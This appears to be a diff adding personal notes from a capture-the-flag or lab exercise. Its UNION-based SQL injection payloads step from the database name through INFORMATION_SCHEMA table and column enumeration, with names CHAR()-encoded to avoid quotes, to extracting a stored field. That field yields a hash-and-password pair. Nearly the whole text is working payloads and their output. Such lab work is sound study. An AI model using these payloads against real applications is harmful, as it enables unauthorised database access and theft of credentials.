@@ -1,0 +1,25 @@
+https://chartio.com/learn/databases/using-information-schema-views-to-check-to-see-if-table-exists-in-sql-server/
+ -------------------------------------------
+
+12 UNION SELECT 1, DATABASE()
+Member_images
+77 101 109 98 101 114 95 105 109 97 103 101 115 
+
+ 12 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.Columns WHERE 
+TABLE_SCHEMA = CHAR(77, 101, 109, 98, 101, 114, 95, 105, 109, 97, 103, 101, 115)
+
+list_images
+108 105 115 116 95 105 109 97 103 101 115
+
+12 UNION SELECT 1, COLUMN_NAME FROM INFORMATION_SCHEMA.Columns WHERE 
+TABLE_NAME = CHAR(108, 105, 115, 116, 95, 105, 109, 97, 103, 101, 115)
+
+id
+url
+title
+comment
+
+12 UNION SELECT 1, comment FROM list_images WHERE 
+id = 5
+
+1928e8083cf461a51303633093573c46:albatroz
